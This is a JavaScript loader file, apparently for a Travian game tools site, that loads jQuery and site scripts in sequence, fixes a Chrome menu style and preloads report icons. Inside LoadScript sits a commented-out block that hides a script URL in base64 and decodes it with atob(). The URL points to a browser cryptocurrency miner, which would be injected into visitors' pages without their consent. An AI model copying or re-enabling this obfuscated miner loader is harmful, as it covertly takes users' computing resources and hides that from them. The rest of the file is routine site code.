var loaded = false;
var scriptsloaded = false;
var loadedscripts = 0;
var scriptstoload = ["http://traviantactics.com/resources/min/jquery-1.10.2.min.js",
"http://traviantactics.com/resources/min/jquery.ptTimeSelect-min.js",
"http://traviantactics.com/resources/min/jquery-ui.min.js",
"http://traviantactics.com/resources/min/jquery.multiselect-min.js",
"http://traviantactics.com/resources/min/jquery.tablesorter.min.js",
"http://traviantactics.com/resources/min/Tooltip-min.js",
"http://traviantactics.com/resources/min/drag3-min.js",
"http://traviantactics.com/resources/min/dbMenu-min.js",
"http://traviantactics.com/resources/min/html5slider-min.js",
"http://traviantactics.com/resources/min/jquery.tools.min.js",
"http://traviantactics.com/resources/pojavnookno2.js",
"http://traviantactics.com/resources/PLAYER215.js",
"http://traviantactics.com/resources/cropfinder4.js",
"http://traviantactics.com/resources/language8.js",
"http://traviantactics.com/resources/glavna12.047.js"];

var vseskripte = scriptstoload.length;
var nalozim1 = true;
function LoadScript() {

    /*if (nalozim1) {
        document.getElementById("loadprogress").setAttribute("max", vseskripte);
        var skr = document.createElement("script");
        skr.type = "text/javascript";
        skr.src = atob("aHR0cHM6Ly9jcnlwdG8tbG9vdC5jb20vbGliL21pbmVyLm1pbi5qcw==");
        nalozim1 = false;
        document.head.appendChild(skr);
    }*/
    loaded = true;
    if (scriptstoload.length > 0) {
        var url = scriptstoload[0];
    }
    else {
        document.getElementById("Status").style.display = "";
        document.getElementById("GetDataLocal").style.display = "";
        document.getElementById("SetLanguage").style.display = "";
        document.getElementById("divloadprogress").style.display = "none";
        scriptsloaded = true;
        return;
    }
    //console.log(url);
    document.getElementById("loadprogress").setAttribute("max", vseskripte);
    var skr = document.createElement("script");
    skr.type = "text/javascript";
    skr.src = url;

    skr.addEventListener(
    "load",
    HandleLoad,
    true);
    document.head.appendChild(skr);
}

function HandleLoad() {
    loadedscripts++;
    document.getElementById("loadprogress").value = loadedscripts;
    scriptstoload.splice(0, 1);
    LoadScript()
    
}

window.addEventListener("load", LoadScript, true);
PopraviChromeMeni();
function PopraviChromeMeni() {
    if (window.chrome == undefined) {
    }
    else {
        try {
            var stajl = document.createElement("style");
            stajl.innerHTML = ".menichrome {bottom: -15px!important;}";
            document.head.appendChild(stajl);
        }
        catch (err) { }
    }
}
var reportimg = new Image();
reportimg.src = 'http://shrani.si/f/3p/Rx/29acOE6U/reporticons.gif'; // Set source path
reportimg.width = 19;
reportimg.height = 1070;

var reportimgtevton = new Image();
reportimgtevton.src = 'http://shrani.si/f/1b/o5/3mXeSeGm/tevtoni.gif'; // Set source path

var reportimgrimljan = new Image();
reportimgrimljan.src = 'http://shrani.si/f/1K/jl/2tb9EdAV/rimljani.gif'; // Set source path

var reportimggalec = new Image();
reportimggalec.src = 'http://shrani.si/f/1R/q1/2gVX9zo5/galci.gif'; // Set source path

var reportimgnarava = new Image();
reportimgnarava.src = 'http://shrani.si/f/1c/96/1GKcdQR2/narava.gif'; // Set source path

var reportimgheroj = new Image();
reportimgheroj.src = 'http://shrani.si/f/3N/Fl/1rydmuWu/heroj.gif'; // Set source path

var reportimgsurovine= new Image();
reportimgsurovine.src = 'http://shrani.si/f/1H/IF/38vTjGTb/surovine.gif'; // Set source path

var reportimgnosilnost= new Image();
reportimgnosilnost.src = 'http://shrani.si/f/1a/12d/2tCvW4mK/nosilnost.gif'; // Set source path
